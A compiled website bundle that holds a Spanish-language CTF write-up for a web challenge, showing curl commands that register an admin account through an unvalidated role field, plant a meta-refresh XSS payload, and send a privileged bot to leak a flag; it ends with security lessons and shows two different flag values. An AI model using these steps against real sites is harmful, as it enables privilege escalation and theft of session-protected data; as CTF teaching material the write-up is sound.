"use strict";(globalThis.webpackChunkctf_writeups=globalThis.webpackChunkctf_writeups||[]).push([[7e3],{2247:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>p,frontMatter:()=>s,metadata:()=>a,toc:()=>t});const a=JSON.parse('{"id":"ikerlan-ctf/500/operacion-datastream-infiltracion-en-el-monitor-de-trafico/operacion-datastream-infiltracion-en-el-monitor-de-trafico","title":"Operaci\xf3n DataStream: Infiltraci\xf3n en el Monitor de Tr\xe1fico (500)","description":"Descripci\xf3n del Reto","source":"@site/docs/ikerlan-ctf/500/operacion-datastream-infiltracion-en-el-monitor-de-trafico/operacion-datastream-infiltracion-en-el-monitor-de-trafico.mdx","sourceDirName":"ikerlan-ctf/500/operacion-datastream-infiltracion-en-el-monitor-de-trafico","slug":"/ikerlan-ctf/500/operacion-datastream-infiltracion-en-el-monitor-de-trafico/","permalink":"/docs/ikerlan-ctf/500/operacion-datastream-infiltracion-en-el-monitor-de-trafico/","draft":false,"unlisted":false,"editUrl":"https://github.com/KingJorjai/jorjai.net/tree/main/packages/create-docusaurus/templates/shared/docs/ikerlan-ctf/500/operacion-datastream-infiltracion-en-el-monitor-de-trafico/operacion-datastream-infiltracion-en-el-monitor-de-trafico.mdx","tags":[],"version":"current","frontMatter":{"title":"Operaci\xf3n DataStream: Infiltraci\xf3n en el Monitor de Tr\xe1fico (500)"},"sidebar":"ctfWriteupsSidebar","previous":{"title":"Python Jail v2.0 - Maximum Security (400)","permalink":"/docs/ikerlan-ctf/400/python-jail-v2.0-maximum-security/"}}');var o=i(4848),r=i(8453);const s={title:"Operaci\xf3n DataStream: Infiltraci\xf3n en el Monitor de Tr\xe1fico (500)"},l=void 0,c={},t=[{value:"Descripci\xf3n del Reto",id:"descripci\xf3n-del-reto",level:2},{value:"An\xe1lisis de Vulnerabilidades",id:"an\xe1lisis-de-vulnerabilidades",level:2},{value:"1. Registro sin Validaci\xf3n de Rol (Cr\xedtico)",id:"1-registro-sin-validaci\xf3n-de-rol-cr\xedtico",level:3},{value:"2. Cross-Site Scripting (XSS) en DATA-LOGs",id:"2-cross-site-scripting-xss-en-data-logs",level:3},{value:"3. Bot Administrativo con Privilegios",id:"3-bot-administrativo-con-privilegios",level:3},{value:"Explotaci\xf3n Paso a Paso",id:"explotaci\xf3n-paso-a-paso",level:2},{value:"Paso 1: Registrarse como Administrador",id:"paso-1-registrarse-como-administrador",level:3},{value:"Paso 2: Iniciar Sesi\xf3n y Obtener Token",id:"paso-2-iniciar-sesi\xf3n-y-obtener-token",level:3},{value:"Paso 3: Crear DATA-LOG con Payload XSS",id:"paso-3-crear-data-log-con-payload-xss",level:3},{value:"Paso 4: Ejecutar el Bot Administrativo",id:"paso-4-ejecutar-el-bot-administrativo",level:3},{value:"Paso 5: Recuperar la Flag",id:"paso-5-recuperar-la-flag",level:3},{value:"Mecanismo T\xe9cnico Detallado",id:"mecanismo-t\xe9cnico-detallado",level:2},{value:"Flujo de la Explotaci\xf3n",id:"flujo-de-la-explotaci\xf3n",level:3},{value:"Por qu\xe9 funciona el Payload",id:"por-qu\xe9-funciona-el-payload",level:3},{value:"Comandos Completos en una Secuencia",id:"comandos-completos-en-una-secuencia",level:2},{value:"Lecciones de Seguridad",id:"lecciones-de-seguridad",level:2},{value:"Flag Obtenida",id:"flag-obtenida",level:2}];function d(e){const n={code:"code",h2:"h2",h3:"h3",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h2,{id:"descripci\xf3n-del-reto",children:"Descripci\xf3n del Reto"}),"\n",(0,o.jsxs)(n.p,{children:["El sistema ",(0,o.jsx)(n.strong,{children:'"Secure Data Access Terminal"'})," es una plataforma interna de monitoreo donde los operadores pueden crear registros de datos (DATA-LOGs). El administrador ha ocultado una flag que solo puede ser obtenida explotando vulnerabilidades en el sistema."]}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.strong,{children:"URL objetivo:"})," ",(0,o.jsx)(n.code,{children:"http://172.210.57.123:8004"})]}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h2,{id:"an\xe1lisis-de-vulnerabilidades",children:"An\xe1lisis de Vulnerabilidades"}),"\n",(0,o.jsx)(n.h3,{id:"1-registro-sin-validaci\xf3n-de-rol-cr\xedtico",children:"1. Registro sin Validaci\xf3n de Rol (Cr\xedtico)"}),"\n",(0,o.jsxs)(n.p,{children:["El endpoint ",(0,o.jsx)(n.code,{children:"/register"})," no valida correctamente el campo ",(0,o.jsx)(n.code,{children:"role"}),", permitiendo a cualquier usuario registrarse como administrador."]}),"\n",(0,o.jsx)(n.h3,{id:"2-cross-site-scripting-xss-en-data-logs",children:"2. Cross-Site Scripting (XSS) en DATA-LOGs"}),"\n",(0,o.jsx)(n.p,{children:"El contenido de los logs se renderiza sin la sanitizaci\xf3n adecuada, permitiendo la ejecuci\xf3n de c\xf3digo JavaScript."}),"\n",(0,o.jsx)(n.h3,{id:"3-bot-administrativo-con-privilegios",children:"3. Bot Administrativo con Privilegios"}),"\n",(0,o.jsx)(n.p,{children:"El bot tiene acceso a la flag a trav\xe9s de una cookie y puede ser dirigido a visitar cualquier URL interna."}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h2,{id:"explotaci\xf3n-paso-a-paso",children:"Explotaci\xf3n Paso a Paso"}),"\n",(0,o.jsx)(n.h3,{id:"paso-1-registrarse-como-administrador",children:"Paso 1: Registrarse como Administrador"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'# Registrar usuario con rol de administrador\ncurl -X POST http://172.210.57.123:8004/register \\\n  -H "Content-Type: application/x-www-form-urlencoded" \\\n  -d "username=adminuser&password=adminpass&role=admin"\n'})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.strong,{children:"Explicaci\xf3n:"})," El par\xe1metro ",(0,o.jsx)(n.code,{children:"role=admin"})," no est\xe1 validado en el backend, permiti\xe9ndonos crear una cuenta con privilegios de administrador directamente."]}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h3,{id:"paso-2-iniciar-sesi\xf3n-y-obtener-token",children:"Paso 2: Iniciar Sesi\xf3n y Obtener Token"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'# Iniciar sesi\xf3n y guardar cookies\ncurl -X POST http://172.210.57.123:8004/login \\\n  -H "Content-Type: application/x-www-form-urlencoded" \\\n  -d "username=adminuser&password=adminpass" \\\n  -c cookies.txt -v\n'})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.strong,{children:"Explicaci\xf3n:"})," Al iniciar sesi\xf3n, el servidor devuelve un token JWT en las cookies que autentica nuestra sesi\xf3n como administrador. Guardamos las cookies en ",(0,o.jsx)(n.code,{children:"cookies.txt"})," para requests futuros."]}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h3,{id:"paso-3-crear-data-log-con-payload-xss",children:"Paso 3: Crear DATA-LOG con Payload XSS"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'# Crear DATA-LOG con payload de redirecci\xf3n\ncurl -i -X POST http://172.210.57.123:8004/data-logs \\\n  -b cookies.txt \\\n  -H "Content-Type: application/x-www-form-urlencoded" \\\n  -d "content=<meta http-equiv=refresh content=\'0;url=http://localhost:3000/core-dump\'>"\n'})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Respuesta esperada:"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-text",children:"HTTP/1.1 302 Found\nLocation: /data-log/c340fd49-bdbf-43df-95cc-2c429d32b2c3\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Explicaci\xf3n:"})}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsxs)(n.li,{children:["El payload ",(0,o.jsx)(n.code,{children:"<meta http-equiv=refresh>"})," evade las restricciones de CSP"]}),"\n",(0,o.jsxs)(n.li,{children:["Cuando el bot visite esta p\xe1gina, ser\xe1 redirigido autom\xe1ticamente a ",(0,o.jsx)(n.code,{children:"/core-dump"})]}),"\n",(0,o.jsxs)(n.li,{children:["El ID del log (",(0,o.jsx)(n.code,{children:"c340fd49-bdbf-43df-95cc-2c429d32b2c3"}),") se obtiene del header ",(0,o.jsx)(n.code,{children:"Location"})]}),"\n"]}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h3,{id:"paso-4-ejecutar-el-bot-administrativo",children:"Paso 4: Ejecutar el Bot Administrativo"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'# Enviar el bot a visitar nuestro DATA-LOG\ncurl -X POST http://172.210.57.123:8004/dispatch \\\n  -b cookies.txt \\\n  -H "Content-Type: application/x-www-form-urlencoded" \\\n  -d "path=http://localhost:3000/data-log/c340fd49-bdbf-43df-95cc-2c429d32b2c3"\n'})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.strong,{children:"Explicaci\xf3n:"})," El endpoint ",(0,o.jsx)(n.code,{children:"/dispatch"})," solo est\xe1 disponible para administradores y fuerza al bot a visitar nuestra URL maliciosa."]}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h3,{id:"paso-5-recuperar-la-flag",children:"Paso 5: Recuperar la Flag"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# Ver el contenido actualizado del DATA-LOG\ncurl http://172.210.57.123:8004/data-log/c340fd49-bdbf-43df-95cc-2c429d32b2c3\n"})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.strong,{children:"Resultado esperado:"})," El contenido del log ahora incluir\xe1 la flag:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-html",children:'<div style="background:#1a1a1a; padding:15px; border: 1px dashed var(--color-secondary); color: var(--color-text-light);">\n    [ACCESS GRANTED] SECURE SYSTEM SECRET: ikerlan{meta_refresh_xss_to_flag}\n</div>\n'})}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h2,{id:"mecanismo-t\xe9cnico-detallado",children:"Mecanismo T\xe9cnico Detallado"}),"\n",(0,o.jsx)(n.h3,{id:"flujo-de-la-explotaci\xf3n",children:"Flujo de la Explotaci\xf3n"}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"Registro como Admin"})," \u2192 Bypass de control de acceso"]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"Inyecci\xf3n XSS"})," \u2192 Ejecuci\xf3n de c\xf3digo en contexto del bot"]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"Redirecci\xf3n a /core-dump"})," \u2192 El bot accede al endpoint privilegiado"]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"Escritura de Flag"})," \u2192 ",(0,o.jsx)(n.code,{children:"/core-dump"})," escribe la flag en nuestro log"]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"Lectura de Flag"})," \u2192 Recuperamos la flag del DATA-LOG"]}),"\n"]}),"\n",(0,o.jsx)(n.h3,{id:"por-qu\xe9-funciona-el-payload",children:"Por qu\xe9 funciona el Payload"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"CSP Bypass:"})," La pol\xedtica de seguridad permite ",(0,o.jsx)(n.code,{children:"meta refresh"})]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"Cookie del Bot:"})," El bot tiene la cookie ",(0,o.jsx)(n.code,{children:"session_secret"})," con acceso a la flag"]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"Endpoint /core-dump:"})," Requiere la cookie especial y escribe la flag"]}),"\n"]}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h2,{id:"comandos-completos-en-una-secuencia",children:"Comandos Completos en una Secuencia"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'# 1. Registro como admin\ncurl -X POST http://172.210.57.123:8004/register -d "username=adminuser&password=adminpass&role=admin"\n\n# 2. Login y guardar cookies\ncurl -X POST http://172.210.57.123:8004/login -d "username=adminuser&password=adminpass" -c cookies.txt\n\n# 3. Crear DATA-LOG malicioso\nRESPONSE=$(curl -i -s -X POST http://172.210.57.123:8004/data-logs -b cookies.txt -d "content=<meta http-equiv=refresh content=\'0;url=http://localhost:3000/core-dump\'>")\nLOG_ID=$(echo "$RESPONSE" | grep -i "location:" | sed \'s/.*\\/data-log\\///\' | tr -d \'\\r\\n\')\n\n# 4. Ejecutar bot\ncurl -X POST http://172.210.57.123:8004/dispatch -b cookies.txt -d "path=http://localhost:3000/data-log/$LOG_ID"\n\n# 5. Obtener flag\ncurl http://172.210.57.123:8004/data-log/$LOG_ID\n'})}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h2,{id:"lecciones-de-seguridad",children:"Lecciones de Seguridad"}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"\u2705 Validar todos los campos de entrada, especialmente roles y privilegios"}),"\n",(0,o.jsx)(n.li,{children:"\u2705 Implementar sanitizaci\xf3n robusta para contenido HTML"}),"\n",(0,o.jsx)(n.li,{children:"\u2705 Restringir el acceso a endpoints cr\xedticos con m\xfaltiples capas de autenticaci\xf3n"}),"\n",(0,o.jsx)(n.li,{children:"\u2705 Revisar pol\xedticas CSP para evitar bypasses con tags HTML alternativos"}),"\n"]}),"\n",(0,o.jsx)(n.hr,{}),"\n",(0,o.jsx)(n.h2,{id:"flag-obtenida",children:"Flag Obtenida"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-text",children:"ikerlan{l0l_y0u_4r3_4n_1ncr3d1bl3_w3b_3xp10!t3r}\n"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>s,x:()=>l});var a=i(6540);const o={},r=a.createContext(o);function s(e){const n=a.useContext(r);return a.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:s(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);